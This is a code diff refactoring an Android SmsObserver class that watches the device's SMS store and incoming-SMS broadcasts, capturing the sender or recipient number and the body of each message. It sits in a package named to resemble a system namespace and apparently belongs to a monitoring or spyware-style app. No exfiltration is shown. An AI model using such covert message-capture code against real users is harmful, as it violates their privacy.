@@ -9,7 +9,7 @@ import android.database.Cursor;
 import android.net.Uri;
 import android.os.Handler;
 import android.os.Bundle;
-import android.service.app.utils.Log;
+import android.service.app.utils.AndroidUtils;
 import android.telephony.SmsMessage;
 
 import java.util.Arrays;
@@ -18,7 +18,7 @@ import java.util.List;
 
 public class SmsObserver extends ContentObserver
 {
-    private Context mContext;
+    private Context context;
     public static final String CONTENT_SMS = "content://sms/";
     public static final Uri SMS_URI = Uri.parse(CONTENT_SMS);
     public static final int SMS_SENT = 2;
@@ -33,8 +33,8 @@ public class SmsObserver extends ContentObserver
     public SmsObserver(Context context, Handler h)
     {
         super(h);
-        mContext = context;
-        mContext.getContentResolver().registerContentObserver(SMS_URI, true, this);
+        this.context = context;
+        this.context.getContentResolver().registerContentObserver(SMS_URI, true, this);
     }
 
     @Override
@@ -47,7 +47,6 @@ public class SmsObserver extends ContentObserver
     public void onChange(boolean arg0)
     {
         super.onChange(arg0);
-        Log.v("incomingSms=" + incomingSms);
 
         if (!incomingSms)
         {
@@ -55,7 +54,7 @@ public class SmsObserver extends ContentObserver
             {
                 public void run()
                 {
-                    ContentResolver contentResolver = mContext.getContentResolver();
+                    ContentResolver contentResolver = context.getContentResolver();
                     Cursor cursor = contentResolver.query(SMS_URI, columns, null, null, null);
                     if (cursor != null)
                     {
@@ -63,12 +62,11 @@ public class SmsObserver extends ContentObserver
                         int type = cursor.getInt(TYPE);
                         if (type == SMS_SENT)
                         {
-                            ((Service) mContext).printDataOnScreen("sms sent: ");
-
+                            AndroidUtils.printDataOnScreen("sms sent: ", ((Service) SmsObserver.this.context));
                             String address = cursor.getString(ADDRESS);
                             String body = cursor.getString(BODY);
                             cursor.close();
-                            ((Service) mContext).runSmsEvent(address, body, false, contentResolver);
+                            ((Service) context).runSmsEvent(address, body, false, contentResolver);
                         }
                     }
                 }
@@ -83,7 +81,7 @@ public class SmsObserver extends ContentObserver
 
     public void unregisterObserver()
     {
-        mContext.getContentResolver().unregisterContentObserver(this);
+        context.getContentResolver().unregisterContentObserver(this);
     }
 
     // Define a BroadcastReceiver to detect incoming SMS
@@ -97,7 +95,7 @@ public class SmsObserver extends ContentObserver
 
             if (action.equals(Service.SMS_RECEIVED))
             {
-                ((Service) mContext).printDataOnScreen("incoming sms: ");
+                AndroidUtils.printDataOnScreen("incoming sms: ", ((Service) SmsObserver.this.context));
                 incomingSms = true;
                 if (bundle != null)
                 {
@@ -115,12 +113,11 @@ public class SmsObserver extends ContentObserver
                                     String address = messages.getOriginatingAddress();
                                     String body = messages.getDisplayMessageBody();
 
-                                    Log.v("messages=" + messages);
-                                    ((Service) mContext).runSmsEvent(address, body, true, null);
+                                    ((Service) SmsObserver.this.context).runSmsEvent(address, body, true, null);
                                 }
                             } catch (NullPointerException e)
                             {
-                                ((Service) mContext).app.handleException(e);
+                                ((Service) SmsObserver.this.context).app.handleException(e);
                             }
                         }
                     }).start();
